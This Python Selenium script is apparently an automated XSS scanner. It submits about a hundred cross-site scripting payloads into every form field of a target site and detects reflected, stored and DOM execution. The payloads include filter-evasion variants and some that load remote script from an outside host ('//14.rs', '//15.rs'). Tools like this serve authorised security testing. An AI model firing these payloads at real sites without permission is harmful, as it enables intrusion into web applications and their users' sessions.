import os
import time
import json
import uuid
import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    StaleElementReferenceException,
    NoAlertPresentException,
    WebDriverException,
)

WEBSITE_URL = "https://example.com"

# - Optional: URL to re-visit for Stored XSS check (set None to reuse WEBSITE_URL)
STORED_CHECK_URL = None   # "https://example.com/comments"

# - (leave empty strings to skip login) 
LOGIN_URL       = ""
LOGIN_EMAIL_ID  = ""
LOGIN_PASS_ID   = ""
LOGIN_BTN_ID    = ""
LOGIN_EMAIL     = ""
LOGIN_PASSWORD  = ""

# Unique session marker (appended to every payload) 
SESSION_MARKER = "XSS_" + uuid.uuid4().hex[:12]

# JS exec flag set by silent payloads
JS_EXEC_FLAG = "__xss_pwned__"

# Output folder
OUTDIR = "xss_scan_results"
os.makedirs(OUTDIR, exist_ok=True)

# Field selector (skips buttons, hidden, etc.)
FIELD_SELECTOR = (
    "input:not([type='button']):not([type='submit'])"
    ":not([type='reset']):not([type='image']):not([type='hidden']), "
    "textarea, [contenteditable='true']"
)

# How long to wait after submit 
WAIT_AFTER_SUBMIT = 1.0
WAIT_STORED_CHECK = 1.5

#  PAYLOAD 
F = JS_EXEC_FLAG   

SILENT_PAYLOADS = [
    # Direct <script> injection
    f"<script>window.{F}=1</script>",
    f"<SCRIPT>window.{F}=1</SCRIPT>",
    f"</script><script>window.{F}=1</script>",
    f"';</script><script>window.{F}=1</script>",
    f"';window.{F}=1;//",
    f'";window.{F}=1;//',
    # SVG onload
    f"<svg onload=window.{F}=1>",
    f"<svg/onload=window.{F}=1>",
    f'<svg onload="window.{F}=1">',
    f"<svg onload=window['{F}']=1>",
    # IMG onerror
    f"<img src=x onerror=window.{F}=1>",
    f'<img src=x onerror="window.{F}=1">',
    f"<--`<img/src=` onerror=window.{F}=1> --!>",
    # iframe
    f"<iframe onload=window.{F}=1>",
    f"<iframe src=javascript:window.{F}=1>",
    # event handlers
    f"<body onload=window.{F}=1>",
    f"<details open ontoggle=window.{F}=1>",
    f"<x onclick=window.{F}=1>click",
    f"<x onmouseover=window.{F}=1>hover",
    f"autofocus onfocus=window.{F}=1",
    # attribute breakout
    f'" onmouseover=window.{F}=1 x="',
    f"' onmouseover=window.{F}=1 x='",
    f'"><img src=x onerror=window.{F}=1>',
    f"'><img src=x onerror=window.{F}=1>",
    f'"><svg onload=window.{F}=1>',
    f'" onmouseover=window.{F}=1 b="',
    # href / javascript URI
    f'<a href="javascript:window.{F}=1">click',
    f"<a href=javascript:window.{F}=1>click",
    f"<object data=javascript:window.{F}=1>",
    # template/expression injection
    f"{{{{constructor.constructor('window.{F}=1')()}}}}",
    f"${{window.{F}=1}}",
]

ALERT_PAYLOADS = [
'<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z',
'<d3"<"/onclick="1>[confirm``]"<">z',
'<d3/onmouseenter=[2].find(confirm)>z',
'<details open ontoggle=confirm()>',
'<script y="><">/*<script* */prompt()</script',
'<w="/x="y>"/ondblclick=`<`[confir\\u006d``]>z',
'<a href="javascript%26colon;alert(1)">click',
'<a href=javas&#99;ript:alert(1)>click',
'<script/"<a"/src=data:=".<a,[8].some(confirm)>',
'<svg/x=">"/onload=confirm()//',
'<--`<img/src=` onerror=confirm``> --!>',
'<svg%0Aonload=%09((pro\\u006dpt))()//',
'<sCript x>(((confirm)))``</scRipt x>',
'<svg </onload ="1> (_=prompt,_(1)) ">',
'<!--><script src=//14.rs>',
'<embed src=//14.rs>',
'<script x=">" src=//15.rs></script>',
'<!\'/*"/*/\'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>',
'<iframe/src \\/\\/onload = prompt(1)',
'<x oncut=alert()>x',
'<svg onload=write()>',
'%0ajavascript:`/*\\"/*-->&lt;svg onload=\'/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//\'">`',
'<svg onload=alert()>',
'</tag><svg onload=alert()>',
'"><svg onload=alert()>',
'"><svg onload=alert()><b attr="',
'" onmouseover=alert() ',
'"onmouseover=alert()//',
'autofocus/onfocus="alert()',
"'-alert()-'",
"'-alert()//'",
"'}alert(1);{'",
"'}%0Aalert(1);%0A{",
'</script><svg onload=alert()>',
'confirm()',
'confirm``',
'(confirm``)',
'{confirm``}',
'[confirm``]',
'(((confirm)))``',
'co\\u006efirm()',
'new class extends confirm``{}',
'[8].find(confirm)',
'[8].map(confirm)',
'[8].some(confirm)',
'[8].every(confirm)',
'[8].filter(confirm)',
'[8].findIndex(confirm)',
'<object data=javascript:confirm()>',
'<a href=javascript:confirm()>click here',
'<script src=//14.rs></script>',
'<script>confirm()</script>',
'<svg/onload=confirm()>',
'<iframe/src=javascript:alert(1)>',
'<svg onload=confirm()>',
'<img src=x onerror=confirm()>',
'<script>confirm()</script>',
'<svg onload=confirm()//',
'<script src=//14.rs></script>',
'<svg onload=co\\u006efirm()>',
'<svg onload=z=co\\u006efir\\u006d,z()>',
'<x onclick=confirm()>click here',
'<x ondrag=aconfirm()>drag it',
'</ScRipT>',
'</script',
'</script/>',
'</script x>',
"1' onerror='alert();//"
]


ALL_PAYLOADS = SILENT_PAYLOADS + ALERT_PAYLOADS



#  Intercepts: MutationObserver, XHR, fetch, eval, Function(), alert

JS_MONITOR = f"""
(function(){{
  if(window.__xss_monitor_installed) return;
  window.__xss_monitor_installed = true;
  window.__xss_monitor = {{
    mutations:[], addedScripts:[], xhrLogs:[], fetchLogs:[],
    evalCalls:[], functionCtorCalls:[], alerts:[], attrChanges:[],
    getAndClear: function(){{
      const c = {{
        mutations: this.mutations.slice(),
        addedScripts: this.addedScripts.slice(),
        xhrLogs: this.xhrLogs.slice(),
        fetchLogs: this.fetchLogs.slice(),
        evalCalls: this.evalCalls.slice(),
        functionCtorCalls: this.functionCtorCalls.slice(),
        alerts: this.alerts.slice(),
        attrChanges: this.attrChanges.slice(),
      }};
      for(const k in c) this[k].length = 0;
      return c;
    }}
  }};

  // MutationObserver
  try {{
    const mo = new MutationObserver(function(muts){{
      muts.forEach(function(m){{
        const r = {{ type:m.type, target: m.target?(m.target.nodeName+(m.target.id?'#'+m.target.id:'')):null,
                    addedNodes:[], attributeName:m.attributeName||null, timestamp:Date.now() }};
        if(m.addedNodes && m.addedNodes.length){{
          Array.prototype.forEach.call(m.addedNodes,function(n){{
            try{{
              const html = n.outerHTML?n.outerHTML.slice(0,1000):null;
              r.addedNodes.push({{nodeName:n.nodeName,outerHTML:html}});
              if(n.nodeName&&n.nodeName.toLowerCase()==='script')
                window.__xss_monitor.addedScripts.push({{outerHTML:html,src:n.src||null,timestamp:Date.now()}});
            }}catch(e){{}}
          }});
        }}
        if(m.type==='attributes'&&m.attributeName){{
          try{{ r.attributeValue=m.target.getAttribute(m.attributeName); }}catch(e){{}}
          window.__xss_monitor.attrChanges.push(r);
        }}
        window.__xss_monitor.mutations.push(r);
      }});
    }});
    mo.observe(document,{{childList:true,subtree:true,attributes:true}});
  }}catch(e){{}}

  // Override alert
  (function(){{try{{
    const orig=window.alert;
    window.alert=function(msg){{
      try{{window.__xss_monitor.alerts.push({{msg:String(msg),timestamp:Date.now()}});}}catch(e){{}}
      return orig.apply(this,arguments);
    }};
  }}catch(e){{}}}}))();

  // Override eval + Function
  (function(){{try{{
    const origEval=window.eval;
    window.eval=function(s){{
      try{{window.__xss_monitor.evalCalls.push({{arg:String(s).slice(0,500),timestamp:Date.now()}});}}catch(e){{}}
      return origEval.apply(this,arguments);
    }};
    const OrigFn=window.Function;
    function WrappedFn(){{
      try{{window.__xss_monitor.functionCtorCalls.push({{args:Array.prototype.slice.call(arguments).join(','),timestamp:Date.now()}});}}catch(e){{}}
      return OrigFn.apply(this,arguments);
    }}
    WrappedFn.prototype=OrigFn.prototype; window.Function=WrappedFn;
  }}catch(e){{}}}}))();

  // Intercept XHR
  (function(){{try{{
    const origOpen=XMLHttpRequest.prototype.open;
    const origSend=XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open=function(){{this.__mon={{method:arguments[0],url:arguments[1]}};return origOpen.apply(this,arguments);}};
    XMLHttpRequest.prototype.send=function(body){{
      const xhr=this; const prev=xhr.onreadystatechange;
      xhr.onreadystatechange=function(){{
        try{{if(xhr.readyState===4){{
          let txt=null;try{{txt=xhr.responseText&&xhr.responseText.slice(0,2000);}}catch(e){{}}
          window.__xss_monitor.xhrLogs.push({{method:xhr.__mon&&xhr.__mon.method,url:xhr.__mon&&xhr.__mon.url,status:xhr.status,responseSample:txt,timestamp:Date.now()}});
        }}}}catch(e){{}}
        if(prev) try{{prev.apply(this,arguments);}}catch(e){{}}
      }};
      return origSend.apply(this,arguments);
    }};
  }}catch(e){{}}}}))();

  // Intercept fetch
  (function(){{try{{
    const origFetch=window.fetch;
    window.fetch=function(){{
      const args=arguments;
      return origFetch.apply(this,args).then(function(resp){{
        try{{if(resp&&resp.clone){{resp.clone().text().then(function(t){{
          window.__xss_monitor.fetchLogs.push({{url:resp.url,status:resp.status,textSample:t&&t.slice(0,2000),timestamp:Date.now()}});
        }}).catch(function(){{}});}}}}catch(e){{}}
        return resp;
      }});
    }};
  }}catch(e){{}}}}))();
}})();
"""


# FORM GROUPING

def get_form_index(driver, element):
    """Return 'form_N' if field is inside a <form>, else None."""
    try:
        return driver.execute_script("""
            let el = arguments[0];
            while (el && el.tagName && el.tagName.toLowerCase() !== 'form')
                el = el.parentElement;
            if (!el || el.tagName.toLowerCase() !== 'form') return null;
            const forms = document.querySelectorAll('form');
            for (let i = 0; i < forms.length; i++)
                if (forms[i] === el) return 'form_' + i;
            return null;
        """, element)
    except Exception:
        return None


def build_groups(driver):
    """
    Scan the page for input fields and group them by parent <form>.
    Returns a list of group dicts:
      { "id": str, "type": "form"|"solo", "indices": [int, ...] }
    where indices are the CSS-selector positions (0-based).
    """
    elements = driver.find_elements(By.CSS_SELECTOR, FIELD_SELECTOR)
    if not elements:
        return []

    form_buckets = {}   # form_id -> [idx, ...]
    solo_list    = []   # [(idx, elem), ...]

    for idx, el in enumerate(elements):
        fid = get_form_index(driver, el)
        if fid:
            form_buckets.setdefault(fid, []).append(idx)
        else:
            solo_list.append(idx)

    groups = []
    for fid, indices in form_buckets.items():
        groups.append({"id": fid, "type": "form", "indices": indices})
    for idx in solo_list:
        groups.append({"id": f"solo_{idx}", "type": "solo", "indices": [idx]})

    return groups


#  BROWSER HELPERS

def inject_monitor(driver):
    try:
        driver.execute_script(JS_MONITOR)
        time.sleep(0.15)
    except Exception:
        pass


def clear_flag(driver):
    try:
        driver.execute_script(f"delete window.{JS_EXEC_FLAG};")
    except Exception:
        pass


def dispatch_events(driver, element):
    """Fire input/change events for React/Vue/Angular."""
    try:
        driver.execute_script(
            "arguments[0].dispatchEvent(new Event('input',  {bubbles:true}));"
            "arguments[0].dispatchEvent(new Event('change', {bubbles:true}));",
            element,
        )
    except Exception:
        pass


def click_submit(driver, last_field):
    """Click nearest submit button, fallback to Enter."""
    try:
        btn = last_field.find_element(
            By.XPATH,
            "./following::button[1] | "
            "./following::input[@type='submit' or @type='button'][1] | "
            "./following::*[@role='button'][1]"
        )
        if btn.is_displayed():
            btn.click()
            return
    except Exception:
        pass
    try:
        last_field.send_keys(Keys.ENTER)
    except Exception:
        pass


def reload_target(driver):
    driver.get(WEBSITE_URL)
    time.sleep(2)
    inject_monitor(driver)


def safe_back(driver):
    try:
        driver.back()
        time.sleep(0.6)
        inject_monitor(driver)
    except Exception:
        reload_target(driver)


def get_monitor_data(driver):
    try:
        data = driver.execute_script(
            "return window.__xss_monitor && window.__xss_monitor.getAndClear "
            "? window.__xss_monitor.getAndClear() : {}"
        )
        return data or {}
    except Exception:
        return {}


#  DETECTION CHECKS

def check_alert(driver):
    try:
        alert = driver.switch_to.alert
        text  = alert.text
        alert.accept()
        return True, text
    except NoAlertPresentException:
        return False, ""
    except Exception:
        return False, ""


def check_js_flag(driver):
    try:
        r = driver.execute_script(f"return window.{JS_EXEC_FLAG};")
        return r is not None and r is not False
    except Exception:
        return False


def check_dom_marker(driver, marker):
    """True if SESSION_MARKER is present unescaped in the live DOM."""
    try:
        return bool(driver.execute_script(
            "return document.documentElement.innerHTML.includes(arguments[0]);",
            marker,
        ))
    except Exception:
        return False


def check_title_changed(driver, original_title):
    try:
        return driver.execute_script("return document.title;") != original_title
    except Exception:
        return False


def analyze_monitor(data):
    hits = []
    for key in ("addedScripts", "evalCalls", "functionCtorCalls", "alerts"):
        if data.get(key):
            hits.append(f"{key}({len(data[key])})")
    return hits


def run_all_checks(driver, original_title, marker, vector_label):
    """
    Run all detection checks and return (reasons_list, alert_text, monitor_data).
    vector_label: 'reflected' | 'stored' | 'dom'
    """
    reasons      = []
    alert_text   = ""
    monitor_data = get_monitor_data(driver)

    # 1) Alert dialog
    alerted, alert_text = check_alert(driver)
    if alerted:
        reasons.append(f"[{vector_label}] alert_dialog: '{alert_text}'")

    # 2) Silent JS exec flag
    if check_js_flag(driver):
        reasons.append(f"[{vector_label}] js_exec_flag set: window.{JS_EXEC_FLAG}")

    # 3) Unescaped marker in DOM
    if check_dom_marker(driver, marker):
        reasons.append(f"[{vector_label}] dom_reflection: marker found in innerHTML")

    # 4) Title changed
    if check_title_changed(driver, original_title):
        reasons.append(f"[{vector_label}] title_changed")

    # 5) Deep monitor (injected scripts, eval, etc.)
    hits = analyze_monitor(monitor_data)
    if hits:
        reasons.append(f"[{vector_label}] monitor_hits: {', '.join(hits)}")

    return reasons, alert_text, monitor_data


#  REPORTING

def save_finding(driver, group_id, payload, reasons, alert_text, monitor_data):
    ts   = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    safe = payload[:35].replace("/", "_").replace(" ", "_").replace(os.sep, "_")
    base = f"{group_id}_{safe}_{ts}"

    ss_path  = os.path.join(OUTDIR, f"screenshot_{base}.png")
    rep_path = os.path.join(OUTDIR, f"report_{base}.json")

    try:
        driver.save_screenshot(ss_path)
    except Exception:
        ss_path = None

    report = {
        "timestamp":      ts,
        "group_id":       group_id,
        "payload":        payload,
        "session_marker": SESSION_MARKER,
        "reasons":        reasons,
        "alert_text":     alert_text,
        "monitor_data":   monitor_data,
        "screenshot":     ss_path,
    }
    try:
        with open(rep_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        rep_path = None

    return ss_path, rep_path


#  FILL + SUBMIT GROUP

def fill_and_submit_group(driver, group, payload):
    """
    Fill every field in `group` with `payload`, then submit.
    Returns True on success, False if a recoverable error occurred.
    """
    try:
        all_fields = driver.find_elements(By.CSS_SELECTOR, FIELD_SELECTOR)
        if not all_fields:
            return False

        last_el = None
        for idx in group["indices"]:
            if idx >= len(all_fields):
                continue
            el = all_fields[idx]
            try:
                el.clear()
            except Exception:
                pass
            field_type = (el.get_attribute("type") or "").lower()
            if field_type == "email":
                el.send_keys("test@example.com")
            else:
                el.send_keys(payload)
            dispatch_events(driver, el)
            last_el = el

        if last_el is not None:
            click_submit(driver, last_el)

        return True

    except StaleElementReferenceException:
        return False
    except Exception as e:
        print(f"    ⚠️  fill_and_submit error: {e}")
        return False


def run_scan():
    options = webdriver.ChromeOptions()
    options.set_capability("goog:loggingPrefs", {"browser": "ALL"})
    # options.add_argument("--headless=new")   # ← uncomment for headless

    driver = webdriver.Chrome(options=options)
    driver.set_window_size(1280, 900)

    # Optional login 
    if LOGIN_URL and LOGIN_EMAIL:
        print("🔑  Logging in …")
        driver.get(LOGIN_URL)
        time.sleep(1.5)
        try:
            driver.find_element(By.ID, LOGIN_EMAIL_ID).send_keys(LOGIN_EMAIL)
            driver.find_element(By.ID, LOGIN_PASS_ID).send_keys(LOGIN_PASSWORD)
            driver.find_element(By.ID, LOGIN_BTN_ID).click()
            time.sleep(2)
            print("    ✅  Logged in.")
        except Exception as e:
            print(f"    ⚠️  Login failed: {e}")

    # Load target page 
    driver.get(WEBSITE_URL)
    time.sleep(1.5)
    inject_monitor(driver)
    original_title = driver.execute_script("return document.title;")

    # Stored check URL 
    stored_url = STORED_CHECK_URL or WEBSITE_URL

    print(f"\n{'═'*68}")
    print(f"  🔍  ULTIMATE XSS SCANNER")
    print(f"  Target  : {WEBSITE_URL}")
    print(f"  Marker  : {SESSION_MARKER}")
    print(f"  Payloads: {len(ALL_PAYLOADS)}  "
          f"({len(SILENT_PAYLOADS)} silent + {len(ALERT_PAYLOADS)} alert-based)")
    print(f"  Vectors : Reflected | Stored | DOM")
    print(f"{'═'*68}\n")

    # Build groups
    groups = build_groups(driver)
    if not groups:
        print("❌  No input fields found on the page.")
        driver.quit()
        return

    print(f"  📋  Groups found: {len(groups)}")
    for g in groups:
        print(f"      [{g['id']}]  fields at DOM positions: {g['indices']}")
    print()

    all_findings = []

    #  LOOP OVER GROUPS

    for g_num, group in enumerate(groups, 1):
        gid   = group["id"]
        n_fld = len(group["indices"])
        print(f"\n{'─'*68}")
        print(f"  Group {g_num}/{len(groups)}  [{gid}]  —  {n_fld} field(s): {group['indices']}")
        print(f"{'─'*68}")

        group_findings = []

        for payload in ALL_PAYLOADS:
            tagged = payload + SESSION_MARKER   # unique per-session marker

            try:
                current_url = driver.current_url
                if WEBSITE_URL.split("?")[0] not in current_url:
                    reload_target(driver)
            except Exception:
                reload_target(driver)

            clear_flag(driver)

            # Fill all fields + submit 
            ok = fill_and_submit_group(driver, group, tagged)
            if not ok:
                print(f"    ⚠️  Stale/error filling group — reloading …")
                reload_target(driver)
                ok = fill_and_submit_group(driver, group, tagged)
                if not ok:
                    continue

            time.sleep(WAIT_AFTER_SUBMIT)

            all_reasons    = []
            all_alert_text = ""
            all_mon        = {}

            #  VECTOR 1: Reflected XSS
            r_reasons, r_alert, r_mon = run_all_checks(
                driver, original_title, SESSION_MARKER, "reflected"
            )
            all_reasons    += r_reasons
            all_alert_text  = all_alert_text or r_alert
            all_mon.update(r_mon)

            #  VECTOR 2: DOM XSS

            try:
                dom_exec = driver.execute_script(f"""
                    // Walk script nodes added after submission
                    const scripts = document.querySelectorAll('script');
                    for (const s of scripts) {{
                        if (s.textContent && s.textContent.includes(arguments[0])) return true;
                    }}
                    return false;
                """, SESSION_MARKER)
                if dom_exec:
                    all_reasons.append("[dom] marker_in_script_tag")
            except Exception:
                pass

            #  VECTOR 3: Stored XSS
            try:
                driver.get(stored_url)
                time.sleep(WAIT_STORED_CHECK)
                inject_monitor(driver)

                s_reasons, s_alert, s_mon = run_all_checks(
                    driver, original_title, SESSION_MARKER, "stored"
                )
                all_reasons    += s_reasons
                all_alert_text  = all_alert_text or s_alert
                all_mon.update(s_mon)

            except Exception as e:
                print(f"    ⚠️  Stored check error: {e}")

            #  RESULT

            if all_reasons:
                print(f"\n  🔴  XSS FOUND  [{gid}]")
                print(f"      Payload: {payload[:80]}")
                for r in all_reasons:
                    print(f"      ↳ {r}")

                ss, rep = save_finding(
                    driver, gid, payload, all_reasons, all_alert_text, all_mon
                )
                if rep:  print(f"      📄 {rep}")
                if ss:   print(f"      📸 {ss}")

                finding = {
                    "group":   gid,
                    "payload": payload,
                    "reasons": all_reasons,
                    "report":  rep,
                }
                group_findings.append(finding)
                all_findings.append(finding)

                reload_target(driver)

            else:
                try:
                    if WEBSITE_URL.split("?")[0] not in driver.current_url:
                        reload_target(driver)
                    else:
                        safe_back(driver)
                except Exception:
                    reload_target(driver)

                print(f"  ✔   [{gid}] no hit: {payload[:60]}")

        if group_findings:
            print(f"\n  ✅  Group [{gid}] — {len(group_findings)} payload(s) triggered XSS.")
        else:
            print(f"\n  ✅  Group [{gid}] — No XSS detected with any payload.")

        reload_target(driver)

    # FINAL SUMMARY
    
    print(f"\n\n{'═'*68}")
    print("  SCAN COMPLETE")
    print(f"{'═'*68}")
    print(f"  Groups scanned : {len(groups)}")
    print(f"  Total findings : {len(all_findings)}\n")

    if all_findings:
        for i, f in enumerate(all_findings, 1):
            print(f"  [{i}] Group [{f['group']}]")
            print(f"       Payload : {f['payload'][:100]}")
            for r in f["reasons"]:
                print(f"       ↳ {r}")
            if f.get("report"):
                print(f"       📄 {f['report']}")
            print()
    else:
        print("  ✅  No XSS vulnerabilities found.")

    print(f"  Reports → ./{OUTDIR}/\n")

    time.sleep(2)
    driver.quit()


if __name__ == "__main__":
    run_scan()